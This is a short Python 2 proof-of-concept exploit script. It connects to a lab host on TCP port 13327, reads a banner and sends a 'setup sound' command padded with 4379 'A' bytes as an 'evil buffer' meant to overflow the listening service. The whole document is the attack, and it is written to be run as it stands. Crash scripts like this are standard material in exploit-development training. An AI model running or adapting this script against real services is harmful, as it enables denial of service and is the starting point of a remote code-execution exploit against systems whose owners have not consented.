#!/usr/bin/python

import socket

host='192.168.56.110'

crash='A' * 4379

buffer='\x11(setup sound ' + crash + '\x90\x00#'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print  'Sending evil buffer...'
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print('Payload Sent')


